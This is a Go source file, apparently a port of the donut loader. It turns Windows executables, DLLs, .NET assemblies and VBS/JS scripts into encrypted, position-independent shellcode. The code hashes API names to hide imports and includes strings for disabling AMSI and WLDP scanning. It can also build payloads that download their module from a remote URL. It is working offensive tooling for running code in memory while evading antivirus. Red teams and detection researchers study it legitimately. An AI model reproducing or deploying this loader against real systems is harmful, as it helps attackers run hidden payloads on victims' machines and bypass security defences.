package donut

import (
	"bytes"
	"encoding/binary"
	"io/ioutil"
	"log"
	"path/filepath"
	"strings"
)

/*
	This code imports PE files and converts them to shellcode using the algorithm and
	stubs taken from the donut loader: https://github.com/TheWover/donut

	You can also use the native-code donut tools to do this conversion.

	This has the donut stubs hard-coded as arrays, so if something rots,
	try updating the stubs to latest donut first.
*/

// ShellcodeFromURL - Downloads a PE from URL, makes shellcode
func ShellcodeFromURL(fileURL string, config *Config) (*bytes.Buffer, error) {
	buf, err := DownloadFile(fileURL)
	if err != nil {
		return nil, err
	}
	return ShellcodeFromBytes(buf, config)
}

// ShellcodeFromFile - Loads PE from file, makes shellcode
func ShellcodeFromFile(filename string, config *Config) (*bytes.Buffer, error) {

	b, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	switch strings.ToLower(filepath.Ext(filename)) {
	case ".exe":
		if config.DotNetMode {
			config.Type = ModuleNETEXE
		} else {
			config.Type = ModuleEXE
		}
	case ".dll":
		if config.DotNetMode {
			config.Type = ModuleNETDLL
		} else {
			config.Type = ModuleDLL
		}
	case ".xsl":
		config.Type = ModuleXSL
	case ".js":
		config.Type = ModuleJS
	case ".vbs":
		config.Type = ModuleVBS
	}
	return ShellcodeFromBytes(bytes.NewBuffer(b), config)
}

// ShellcodeFromBytes - Passed a PE as byte array, makes shellcode
func ShellcodeFromBytes(buf *bytes.Buffer, config *Config) (*bytes.Buffer, error) {

	if err := CreateModule(config, buf); err != nil {
		return nil, err
	}
	instance, err := CreateInstance(config)
	if err != nil {
		return nil, err
	}
	// If the module will be stored on a remote server
	if config.InstType == InstanceURL {
		log.Printf("Saving %s to disk.\n", config.ModuleName)
		// save the module to disk using random name
		instance.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0})          // mystery padding
		config.ModuleData.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0}) // mystery padding
		ioutil.WriteFile(config.ModuleName, config.ModuleData.Bytes(), 0644)
	}
	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
	return Sandwich(config.Arch, instance)
}

// Sandwich - adds the donut prefix in the beginning (stomps DOS header),
// then payload, then donut stub at the end
func Sandwich(arch Arch, payload *bytes.Buffer) (*bytes.Buffer, error) {
	/*
			Disassembly:
					   0:  e8 					call $+
					   1:  xx xx xx xx			instance length
					   5:  [instance]
		 x=5+instanceLen:  0x59					pop ecx
		             x+1:  stub preamble + stub (either 32 or 64 bit or both)
	*/

	w := new(bytes.Buffer)
	instanceLen := uint32(payload.Len())
	w.WriteByte(0xE8)
	binary.Write(w, binary.LittleEndian, instanceLen)
	if _, err := payload.WriteTo(w); err != nil {
		return nil, err
	}
	w.WriteByte(0x59)

	picLen := int(instanceLen) + 32

	switch arch {
	case X32:
		w.WriteByte(0x5A) // preamble: pop edx, push ecx, push edx
		w.WriteByte(0x51)
		w.WriteByte(0x52)
		w.Write(loaderX86)
		picLen += len(loaderX86)
	case X64:
		w.Write(loaderX64)
		picLen += len(loaderX64)
	case X84:
		w.WriteByte(0x31) // preamble: xor eax,eax
		w.WriteByte(0xC0)
		w.WriteByte(0x48) // dec ecx
		w.WriteByte(0x0F) // js dword x86_code (skips length of x64 code)
		w.WriteByte(0x88)
		binary.Write(w, binary.LittleEndian, uint32(len(loaderX64)))
		w.Write(loaderX64)

		w.Write([]byte{0x5A, // in between 32/64 stubs: pop edx
			0x51,  // push ecx
			0x52}) // push edx
		w.Write(loaderX86)
		picLen += len(loaderX86)
		picLen += len(loaderX64)
	}

	lb := w.Len()
	for i := 0; i < picLen-lb; i++ {
		w.WriteByte(0x0)
	}

	return w, nil
}

// CreateModule - Creates the Donut Module from Config
func CreateModule(config *Config, inputFile *bytes.Buffer) error {

	mod := new(Module)
	mod.ModType = uint32(config.Type)
	mod.Thread = uint32(config.Thread)
	mod.Unicode = uint32(config.Unicode)
	mod.Compress = uint32(config.Compress)

	if config.Type == ModuleNETDLL ||
		config.Type == ModuleNETEXE {
		// If no domain name specified, generate a random one
		if config.Domain == "" && config.Entropy != EntropyNone {
			config.Domain = RandomString(domainLen)
		} else {
			config.Domain = "AAAAAAAA"
		}
		copy(mod.Domain[:], []byte(config.Domain)[:])

		if config.Type == ModuleNETDLL {
			log.Println("Class:", config.Class)
			copy(mod.Cls[:], []byte(config.Class)[:])
			log.Println("Method:", config.Method)
			copy(mod.Method[:], []byte(config.Method)[:])
		}
		// If no runtime specified in configuration, use default
		if config.Runtime == "" {
			config.Runtime = "v2.0.50727"
		}
		log.Println("Runtime:", config.Runtime)
		copy(mod.Runtime[:], []byte(config.Runtime)[:])
	} else if config.Type == ModuleDLL && config.Method != "" {
		// Unmanaged DLL? check for exported api
		log.Println("DLL function:", config.Method)
		copy(mod.Method[:], []byte(config.Method))
	}
	mod.ZLen = 0
	mod.Len = uint32(inputFile.Len())

	if config.Parameters != "" {
		skip := false
		// if type is unmanaged EXE
		if config.Type == ModuleEXE {
			// and entropy is enabled
			if config.Entropy != EntropyNone {
				// generate random name
				copy(mod.Param[:], []byte(RandomString(domainLen) + " ")[:])
			} else {
				// else set to "AAAA "
				copy(mod.Param[:], []byte("AAAAAAAA ")[:])
				copy(mod.Param[9:], []byte(config.Parameters)[:])
				skip = true
			}
		}
		if !skip {
			copy(mod.Param[:], []byte(config.Parameters)[:])
		}
	}

	// read module into memory
	b := new(bytes.Buffer)
	mod.WriteTo(b)
	inputFile.WriteTo(b)
	config.ModuleData = b

	// update configuration with pointer to module
	config.Module = mod
	return nil
}

// CreateInstance - Creates the Donut Instance from Config
func CreateInstance(config *Config) (*bytes.Buffer, error) {

	inst := new(Instance)
	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
	instLen := uint32(3312 + 352 + 8)
	inst.Bypass = uint32(config.Bypass)

	// if this is a PIC instance, add the size of module
	// that will be appended to the end of structure
	if config.InstType == InstancePIC {
		log.Printf("The size of module is %v bytes. Adding to size of instance.\n", modLen)
		instLen += modLen
	}

	if config.Entropy == EntropyDefault {
		log.Println("Generating random key for instance")
		tk, err := RandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyMk[:], tk)

		tk, err = RandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.KeyCtr[:], tk)

		log.Println("Generating random key for module")
		tk, err = RandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyMk[:], tk)

		tk, err = RandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKeyCtr[:], tk)

		log.Println("Generating random string to verify decryption")
		sbsig := RandomString(signatureLen)
		copy(inst.Sig[:], []byte(sbsig))

		log.Println("Generating random IV for Maru hash")
		iv, err := RandomBytes(maruIVLen)
		if err != nil {
			return nil, err
		}
		inst.Iv = binary.LittleEndian.Uint64(iv)

		inst.Mac = Maru(inst.Sig[:], inst.Iv)
	}
	log.Println("Generating hashes for API using IV:", inst.Iv)

	for cnt, c := range apiImports {
		// calculate hash for DLL string
		dllHash := Maru([]byte(c.Module), inst.Iv)

		// calculate hash for API string.
		// xor with DLL hash and store in instance
		inst.Hash[cnt] = Maru([]byte(c.Name), inst.Iv) ^ dllHash

		log.Printf("Hash for %s : %s = %x\n",
			c.Module,
			c.Name,
			inst.Hash[cnt])
	}
	// save how many API to resolve
	inst.ApiCount = uint32(len(apiImports))
	copy(inst.DllNames[:], "ole32;oleaut32;wininet;mscoree;shell32")

	// if module is .NET assembly
	if config.Type == ModuleNETDLL ||
		config.Type == ModuleNETEXE {
		log.Println("Copying GUID structures and DLL strings for loading .NET assemblies")
		copy(inst.XIIDAppDomain[:], xIIDAppDomain[:])
		copy(inst.XIIDICLRMetaHost[:], xIIDICLRMetaHost[:])
		copy(inst.XCLSIDCLRMetaHost[:], xCLSIDCLRMetaHost[:])
		copy(inst.XIIDICLRRuntimeInfo[:], xIIDICLRRuntimeInfo[:])
		copy(inst.XIIDICorRuntimeHost[:], xIIDICorRuntimeHost[:])
		copy(inst.XCLSIDCorRuntimeHost[:], xCLSIDCorRuntimeHost[:])
	} else if config.Type == ModuleVBS ||
		config.Type == ModuleJS {
		log.Println("Copying GUID structures and DLL strings for loading VBS/JS")

		copy(inst.XIIDIUnknown[:], xIIDIUnknown[:])
		copy(inst.XIIDIDispatch[:], xIIDIDispatch[:])
		copy(inst.XIIDIHost[:], xIIDIHost[:])
		copy(inst.XIIDIActiveScript[:], xIIDIActiveScript[:])
		copy(inst.XIIDIActiveScriptSite[:], xIIDIActiveScriptSite[:])
		copy(inst.XIIDIActiveScriptSiteWindow[:], xIIDIActiveScriptSiteWindow[:])
		copy(inst.XIIDIActiveScriptParse32[:], xIIDIActiveScriptParse32[:])
		copy(inst.XIIDIActiveScriptParse64[:], xIIDIActiveScriptParse64[:])

		copy(inst.WScript[:], "WScript")
		copy(inst.WScriptEXE[:], "wscript.exe")

		if config.Type == ModuleVBS {
			copy(inst.XCLSIDScriptLanguage[:], xCLSIDVBScript[:])
		} else {
			copy(inst.XCLSIDScriptLanguage[:], xCLSIDJScript[:])
		}
	}

	// required to disable AMSI
	copy(inst.Clr[:], "clr")
	copy(inst.AMSI[:], "amsi")
	copy(inst.AmsiInit[:], "AmsiInitialize")
	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
	copy(inst.AmsiScanStr[:], "AmsiScanString")

	// stuff for PE loader
	if len(config.Parameters) > 0 {
		copy(inst.DataName[:], ".data")
		copy(inst.KernelBase[:], "kernelbase")

		copy(inst.CmdSyms[:],
			"_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv")
	}
	if config.Thread != 0 {
		copy(inst.ExitApi[:], "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit")
	}
	// required to disable WLDP
	copy(inst.WLDP[:], "wldp")
	copy(inst.WldpQuery[:], "WldpQueryDynamicCodeTrust")
	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")

	// set the type of instance we're creating
	inst.Type = uint32(int(config.InstType))

	// indicate if we should call RtlExitUserProcess to terminate host process
	inst.ExitOpt = config.ExitOpt
	// set the fork option
	inst.OEP = config.OEP
	// set the entropy level
	inst.Entropy = config.Entropy

	// if the module will be downloaded
	// set the URL parameter and request verb
	if inst.Type == InstanceURL {
		if config.ModuleName != "" {
			if config.Entropy != EntropyNone {
				// generate a random name for module
				// that will be saved to disk
				config.ModuleName = RandomString(maxModuleName)
				log.Println("Generated random name for module :", config.ModuleName)
			} else {
				config.ModuleName = "AAAAAAAA"
			}
		}
		log.Println("Setting URL parameters")
		// append module name
		copy(inst.Url[:], config.URL+"/"+config.ModuleName)
		// set the request verb
		copy(inst.Req[:], "GET")
		log.Println("Payload will attempt download from:", string(inst.Url[:]))
	}

	inst.ModuleLen = uint64(modLen) + 8
	inst.Len = instLen
	config.inst = inst
	config.instLen = instLen

	if config.InstType == InstanceURL && config.Entropy == EntropyDefault {
		log.Println("encrypting module for download")
		config.ModuleMac = Maru(inst.Sig[:], inst.Iv)
		config.ModuleData = bytes.NewBuffer(Encrypt(
			inst.ModKeyMk[:],
			inst.ModKeyCtr[:],
			config.ModuleData.Bytes()))
		b := new(bytes.Buffer)
		inst.Len = instLen - 8 /* magic padding */
		inst.WriteTo(b)
		for uint32(b.Len()) < instLen-16 /* magic padding */ {
			b.WriteByte(0)
		}
		return b, nil
	}
	// else if config.InstType == InstancePIC
	b := new(bytes.Buffer)
	inst.WriteTo(b)
	if _, err := config.ModuleData.WriteTo(b); err != nil {
		log.Fatal(err)
	}
	for uint32(b.Len()) < config.instLen {
		b.WriteByte(0)
	}
	if config.Entropy != EntropyDefault {
		return b, nil
	}
	log.Println("encrypting instance")
	instData := b.Bytes()
	offset := 4 + // Len uint32
		cipherKeyLen + cipherBlockLen + // Instance Crypt
		4 + // pad
		8 + // IV
		(64 * 8) + // Hashes (64 uuids of len 64bit)
		4 + // exit_opt
		4 + // entropy
		8 // OEP

	encInstData := Encrypt(
		inst.KeyMk[:],
		inst.KeyCtr[:],
		instData[offset:])

	bc := new(bytes.Buffer)
	binary.Write(bc, binary.LittleEndian, instData[:offset]) // unencrypted header
	if _, err := bc.Write(encInstData); err != nil {         // encrypted body
		log.Fatal(err)
	}
	log.Println("Leaving.")
	return bc, nil
}

// DefaultConfig - returns a default donut config for x32+64, EXE, native binary
func DefaultConfig() *Config {
	return &Config{
		Arch:     X84,
		Type:     ModuleEXE,
		InstType: InstancePIC,
		Entropy:  EntropyDefault,
		Compress: 1,
		Format:   1,
		Bypass:   3,
	}
}
